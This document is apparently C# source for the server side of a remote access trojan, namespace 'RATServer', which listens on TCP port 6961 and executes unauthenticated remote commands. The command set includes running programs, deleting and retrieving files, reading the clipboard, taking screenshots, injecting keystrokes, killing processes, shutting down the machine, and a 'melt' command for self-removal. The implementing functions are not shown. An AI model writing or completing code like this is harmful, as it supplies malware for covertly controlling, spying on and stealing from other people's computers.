using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Xml;
using System.Xml.Serialization;

namespace RATServer
{
    public class Program
    {
        #region "Declarations"
        static int port = 6961;
        static TcpClient sock = new TcpClient();
        static TcpListener tcpc = new TcpListener(port);
        #endregion
        #region "Main"
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine("Server Running...");
            while (true)
            {
                while (!sock.Connected) Listen();
                while (sock.Connected) Check();
            }
        }
        #endregion
        #region "Connection Methods"
        static void Listen()
        {
            try
            {
                tcpc.Start();
                sock = new TcpClient();
                sock = tcpc.AcceptTcpClient();
            } catch { }
        }
        static void Check()
        {
            if (sock.Connected)
            {
                sock.SendTimeout = 5000;
                try
                {
                    bool exitAfter = false;
                    NetworkStream nstream = sock.GetStream();
                    byte[] message = new byte[sock.ReceiveBufferSize + 1];
                    int bytesRead = nstream.Read(message, 0, sock.ReceiveBufferSize);
                    if (bytesRead == 0) { sock.Close(); return; }
                    Command c = DeserializeFromXml<Command>(Encoding.Unicode.GetString(message, 0, bytesRead));
                    Response r = new Response();
                    switch (c.CMD)
                    {
                        case "message":
                            r = Functions.Message(c.Args);
                            break;
                        case "run":
                            r = Functions.Run(c.Args[0]);
                            break;
                        case "info":                       
                            r = Functions.PCInfo();
                            break;
                        case "processes":
                            r = Functions.Processes();
                            break;
                        case "delete":
                            r = Functions.Delete(c.Args[0]);
                            break;
                        case "download":
                            r = Functions.Download(c.Args[0], c.Args[1]);
                            break;
                        case "shutdown":
                            r = Functions.ShutDown();
                            break;
                        case "clipboard":
                            r = Functions.ClipBoard();
                            break;
                        case "sendkeys":
                            r = Functions.KeyPress(c.Args[0]);
                            break;
                        case "services":
                            r = Functions.Services();
                            break;
                        case "retrieve":
                            r = Functions.Retrieve(c.Args[0]);
                            break;
                        case "search":
                            r = Functions.Search(c.Args[0]);
                            break;
                        case "software":
                            r = Functions.Software();
                            break;
                        case "screenshot":
                            r = Functions.ScreenShot();
                            break;
                        case "restart":
                            r = Functions.Restart();
                            break;
                        case "logoff":
                            r = Functions.LogOff();
                            break;
                        case "taskkill":
                            r = Functions.TaskKill(c.Args[0]);
                            break;
                        case "ipconfig":
                            r = Functions.IPConfig();
                            break;
                        case "tree":
                            r = Functions.Tree(c.Args[0]);
                            break;
                        case "netstat":
                            r = Functions.NetStat();
                            break;
                        case "ping":
                            r = Functions.Ping(c.Args[0]);
                            break;
                        case "melt":
                            r = Functions.Melt();
                            exitAfter = true;
                            break;
                        case "talk":
                            r = Functions.Talk(c.Args);
                            break;
                        default:
                            break;
                    }                 
                    byte[] sendBytes = Encoding.Unicode.GetBytes(SerializeToXml(r));
                    nstream.Write(sendBytes, 0, sendBytes.Length);
                    if (exitAfter) { Environment.Exit(0); }
                }
                catch { Check(); }
            }
        }
        #endregion
        #region "Helper Methods"
        static T DeserializeFromXml<T>(string xml)
        {
            T z;
            XmlSerializer x = new XmlSerializer(typeof(T));
            using (TextReader y = new StringReader(xml))
            {
                z = (T)x.Deserialize(y);
            }
            return z;
        }
        static string SerializeToXml<T>(T obj)
        {
            XmlSerializer x = new XmlSerializer(typeof(T));
            using (var z = new StringWriter())
            {
                using (XmlTextWriter w = new XmlTextWriter(z) { Formatting = Formatting.None })
                {
                    x.Serialize(w, obj);
                    return z.ToString();
                }
            }
        }
        #endregion
    }
    #region "Objects  
    [Serializable]
    public class Command
    {
        public string CMD { get; set; }
        public string[] Args { get; set; }
    }
    [Serializable]
    public class Response
    {
        public string Type { get; set; }
        public string Msg { get; set; }
        public byte[] Data { get; set; }
    }
    #endregion
}